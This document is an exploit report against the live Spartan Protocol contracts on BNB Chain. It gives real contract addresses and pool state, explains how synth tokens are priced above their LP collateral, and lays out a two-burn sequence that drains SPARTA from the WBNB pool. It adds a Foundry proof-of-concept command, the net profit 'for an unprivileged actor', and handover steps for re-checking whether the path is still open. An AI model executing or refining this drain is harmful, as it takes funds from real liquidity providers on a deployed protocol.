# EX-07 — Spartan Protocol: `burnSynth` redeems synth above its LP collateral

**Net for an unprivileged actor:** **~$600 conservative** (gross ~$1,274; burned collateral ~$177; the report's net before the conservative haircut is ~$1,097)
**Confidence:** MEDIUM — fork-proven, but the Reserve global freeze caps the run at two burns
**Gate:** capital (acquire synth; the staked/burned synth is returned)
**Chain:** BNB Chain (56)
**Status:** headline C4 2021-07 H-11 (`mintSynth` AMM pricing) is PATCHED/disabled; this is the mirror `burnSynth` path.

## Contracts

| Role | Address |
|---|---|
| PoolFactory (verified, solc 0.8.3) | `0x2C577706579E08A88bd30df0Fd7A5778A707c3AD` |
| WBNB Pool | `0x972C7278ECFdCF97556F9C53075576a8bC6547ab` |
| SPARTA/USDT Pool (price) | `0x511d2fB8458eb46eCcAEeaeAE722cCe769aAe779` |
| Synth (WBNB) | `0x6D83A365C947E79a86a65b83AFf77284A360495E` |
| Router | `0xf73d255d1E2b184cDb7ee0a8A064500eB3f6b352` |
| Reserve | `0xe548561782c2F4f1145B654A41C47F49159913B0` |

Live WBNB pool: `baseAmount` 13,066,075.57 SPARTA; `tokenAmount` 4.3377 WBNB; `totalSupply` 88,559.82 LP. Synth: `totalSupply` 10.132; `collateral` 6,014.44 LP. SPARTA ≈ $0.0002331.

## Bug

`Router.swapSynthToAsset` → `Pool.burnSynth(recipient, member)` pays `calcSwapOutput(x, tokenAmount, baseAmount) * 95%` for the synth, but the synth is backed by only 6,014.44 LP against a 10.132 synth supply. The AMM formula prices the synth far above its LP collateral, so burning synth drains the pool's SPARTA. `Synth.burnSynth(x)` burns only `x * collateral / totalSupply` LP.

The audited `mintSynth` path is disabled (`Router.synthMinting() = false`); the other three highs are closed. This mirror path is live.

## Step-by-step

```
acquire 4.3377 synth
Router.swapSynthToAsset(recipient, synth, 4.3377e18)
// burn 1: 3,103,192.95 SPARTA
// burn 2: 2,366,184.62 SPARTA (total 5,469,377.57)
// third burn reverts !SAFE (Reserve global freeze)
```

The same one-burn step is available in the USDC/BTCB/USDT pools for ~520k more SPARTA (~$121) before the freeze.

## PoC

`stage3/work/S3-221/Spartan_Protocol_Contest_0x2C5777/poc/test/SpartanDrain.t.sol`

```solidity
// fork at BSC block 133125808
burnSynth(4.3377e18) -> 3,103,192.95 SPARTA
burnSynth(4.3377e18) -> total 5,469,377.57 SPARTA
third burn -> revert !SAFE
```

Run:

```bash
cd stage3/work/S3-221/Spartan_Protocol_Contest_0x2C5777/poc
BSC_RPC=<bsc-rpc> /workspaces/CA/research/tools/foundry/forge test \
  --match-test testSpartanDrain -vv
```

## Economics

- Gross 5,469,377.57 SPARTA ≈ $1,274 at $0.0002331.
- Burned synth collateral ≈ 5,149.77 LP ≈ $177.
- Net ≈ $1,097; the report records **$600** conservatively after slippage/liquidity.
- Two burns max before `Reserve.globalFreeze`; one burn in each of three other pools adds ~$121.

## Evidence

- `evidence/PoolFactory.sol`, `Utils.live.sol`, `SynthVault.live.sol`, `Router.live.sol` — verified sources.
- `evidence/pools_state.json` — pool/synth state.
- PoC output in `poc/`.
- BscScan verified PoolFactory `0x2C5777…`; Router `synthMinting()=false`; Reserve `globalFreeze()=false`.

## Risks / caveats

- MEDIUM because the Reserve freeze caps the run and the SPARTA sale moves the price; the $600 is conservative.
- The synth supply/collateral ratio may change; re-read before relying.
- If the team enables `globalFreeze` or patches `burnSynth`, the path closes.

## Handover

1. Re-read the WBNB/USDC/BTCB/USDT pools and synth collateral at the latest block.
2. Re-run the PoC; confirm the two-burn cap and the `!SAFE` third revert.
3. Measure SPARTA sale slippage; recompute net.
4. Check whether `globalFreeze` is now true.
